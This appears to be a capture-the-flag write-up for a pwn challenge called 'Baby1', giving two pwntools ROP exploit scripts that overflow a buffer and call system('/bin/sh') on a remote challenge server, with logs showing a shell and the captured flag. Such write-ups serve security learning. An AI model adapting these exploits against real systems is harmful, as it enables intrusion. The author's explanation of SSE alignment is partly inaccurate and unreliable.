## Baby1
### Category : Misc

---

So, after decompilation in Ghidra, looking at the strings. It looked like [BabyRop](../Harekaze/Babyrop.md) from Harekaze CTF. But the script didn't work. It kept giving a segmentation fault. After some research, I came across that Ubuntu uses SSE Registers in its libc functions.

SSE Registers need memory aligned with the registers for the commands to be executed. So we need to pad the payload with `ret` insturctions for it to work.



---

### Unintended Solution. 

---

So, while working on the problem, my offset function failed, and returned -1. For some reason, that gave me an access to the shell. Giving me the flag.

So, to get the bug again, I set offset = -1. 

exploit.py

```
from pwn import *

def get_offset(elf):
    io = process(elf.path)
    io.sendline(cyclic(2010))
    io.wait()
    core = io.corefile
    stack = core.rsp
    info("%#x stack", stack)
    pattern = core.read(stack, 4)
    info("%r pattern", pattern)
    offset = cyclic_find(pattern)
    info("OFFSET : %s",offset)
    return offset

elf = context.binary = ELF('baby1')

offset = -1

shell = next(elf.search("/bin/sh"))

system = elf.symbols.system

ret = 0x000000000040053e
pop_gadget = 0x0000000000400793

info("SYSTEM : %#x" , system)
info ("SHELL : %#x", shell)
info("POP Gadget : %#x",pop_gadget)
shell = p64(shell)
system = p64(system)
ret = p64(ret)
pop_gadget = p64(pop_gadget)
info("SYSTEM : %s" , system)
info ("SHELL : %s", shell)
info("POP Gadget : %s",pop_gadget)

payload = 'A'*(offset)
payload += ret*8
payload += pop_gadget
payload += shell
payload += system

print(len(payload))
#io = process(elf.path)
io = remote('baby-01.pwn.beer',10001)
#payload = "A"*40 + gadget + print_flag + system
io.recvuntil("input: ")
io.sendline(payload)
io.interactive()
```

Output

```
python2 exploit.py           Thursday 23 May 2019 09:34:57 PM IST
[*] '/sec_fest/baby1/baby1'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] SYSTEM : 0x400560
[*] SHELL : 0x400286
[*] POP Gadget : 0x400793
[*] SYSTEM : `\x05@\x00\x00\x00\x00\x00
[*] SHELL : \x86@\x00\x00\x00\x00\x00
[*] POP Gadget : \x93\x07@\x00\x00\x00\x00\x00
88
[+] Opening connection to baby-01.pwn.beer on port 10001: Done
[*] Switching to interactive mode
$ whoami
baby1
$ ls
baby1
flag
redir.sh
$ cat flag
sctf{1.p0p_r3GIs73rS_2.pOp_5H3lL_3.????_4.pr0FiT}
$ exit
/home/baby1/redir.sh: line 2:  1646 Segmentation fault      (core dumped) ./baby1
[*] Got EOF while reading in interactive
$ 
$ 
[*] Closed connection to baby-01.pwn.beer port 10001
[*] Got EOF while sending in interactive
 ~/D/s/baby1  code exploit.py      11.8s  Thursday 23 May 2019 09:35:35 PM IST
 ~/D/s/baby1                       191ms  Thursday 23 May 2019 09:36:12 PM IST
 ~/D/s/baby1  python2 exploit.py   191ms  Thursday 23 May 2019 09:36:49 PM IST
[*] '/sec_fest/baby1/baby1'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] SYSTEM : 0x400560
[*] SHELL : 0x400286
[*] POP Gadget : 0x400793
[*] SYSTEM : `\x05@\x00\x00\x00\x00\x00
[*] SHELL : \x86@\x00\x00\x00\x00\x00
[*] POP Gadget : \x93\x07@\x00\x00\x00\x00\x00
88
[+] Opening connection to baby-01.pwn.beer on port 10001: Done
[*] Switching to interactive mode
$ whoami
baby1
$ ls
baby1
flag
redir.sh
$ cat flag
sctf{1.p0p_r3GIs73rS_2.pOp_5H3lL_3.????_4.pr0FiT}
$ exit
/home/baby1/redir.sh: line 2:  1672 Segmentation fault      (core dumped) ./baby1
$ 
[*] Got EOF while reading in interactive
$ 
[*] Closed connection to baby-01.pwn.beer port 10001
[*] Got EOF while sending in interactive
```
---

### Intended Solution
---

[SSE](https://en.wikibooks.org/wiki/X86_Assembly/SSE) are 2 registers working as a single register. But in x86, unaligned memory access mov in 2 cyles and aligned in 1. So if they are unaligned, always, we'd end up filling half the register in 1 cycle and half in the 2nd half. So, SSE rejects the address resulting in a segfault. So whenever we call system(), in reality it is calling do_system(), and to align it by one more cycle, we need to pad the exploit with an additional address. Hence, we pad it with a ret gadget. 

exploit.py

```
from pwn import *

def get_offset(elf):
    io = process(elf.path)
    io.sendline(cyclic(2010))
    io.wait()
    core = io.corefile
    stack = core.rsp
    info("%#x stack", stack)
    pattern = core.read(stack, 4)
    info("%r pattern", pattern)
    offset = cyclic_find(pattern)
    info("OFFSET : %s",offset)
    return offset

elf = context.binary = ELF('baby1')

offset = get_offset(elf)

shell = next(elf.search("/bin/sh"))

system = elf.symbols.system

ret = 0x000000000040053e
pop_gadget = 0x0000000000400793

info("SYSTEM : %#x" , system)
info ("SHELL : %#x", shell)
info("POP Gadget : %#x",pop_gadget)
shell = p64(shell)
system = p64(system)
ret = p64(ret)
pop_gadget = p64(pop_gadget)
info("SYSTEM : %s" , system)
info ("SHELL : %s", shell)
info("POP Gadget : %s",pop_gadget)

payload = 'A'*(offset)
payload += ret
payload += pop_gadget
payload += shell
payload += system

print(len(payload))
#io = process(elf.path)
io = remote('baby-01.pwn.beer',10001)
#payload = "A"*40 + gadget + print_flag + system
io.recvuntil("input: ")
io.sendline(payload)
io.interactive()
```
output
```
python2 exploit.py                                               8.3s  Thu 23 May 2019 21:51:47 IST
[*] '/sec_fest/baby1/baby1'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Starting local process '/sec_fest/baby1/baby1': pid 867
[*] Process '/sec_fest/baby1/baby1' stopped with exit code -11 (SIGSEGV) (pid 867)
[!] Found bad environment at 0x7ffc0f722fc0
[+] Parsing corefile...: Done
[*] '/sec_fest/baby1/core.867'
    Arch:      amd64-64-little
    RIP:       0x400727
    RSP:       0x7ffc0f721258
    Exe:       '/sec_fest/baby1/baby1' (0x400000)
    Fault:     0x6161616861616167
[*] 0x7ffc0f721258 stack
[*] 'gaaa' pattern
[*] OFFSET : 24
[*] SYSTEM : 0x400560
[*] SHELL : 0x400286
[*] POP Gadget : 0x400793
[*] SYSTEM : `\x05@\x00\x00\x00\x00\x00
[*] SHELL : \x86@\x00\x00\x00\x00\x00
[*] POP Gadget : \x93\x07@\x00\x00\x00\x00\x00
56
[+] Opening connection to baby-01.pwn.beer on port 10001: Done
[*] Switching to interactive mode
$ whoami
baby1
$ ls
baby1
flag
redir.sh
$ cat flag
sctf{1.p0p_r3GIs73rS_2.pOp_5H3lL_3.????_4.pr0FiT}
$ exit
/home/baby1/redir.sh: line 2:  1866 Illegal instruction     (core dumped) ./baby1
[*] Got EOF while reading in interactive
$ 
$ 
[*] Closed connection to baby-01.pwn.beer port 10001
[*] Got EOF while sending in interactive
```